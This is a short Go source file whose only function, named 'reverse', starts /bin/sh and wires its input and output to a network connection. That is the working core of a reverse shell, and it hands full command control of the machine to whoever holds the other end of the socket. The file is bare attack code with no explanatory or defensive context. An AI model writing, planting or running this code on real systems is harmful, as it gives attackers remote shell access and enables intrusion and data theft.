package main

import (
	"bufio"
	"net"
	"os/exec"
)

func reverse(c net.Conn, reader *bufio.Reader) {
	cmd := exec.Command("/bin/sh")
	cmd.Stdin, cmd.Stdout, cmd.Stderr = c, c, c
	cmd.Run()
	c.Close()
}
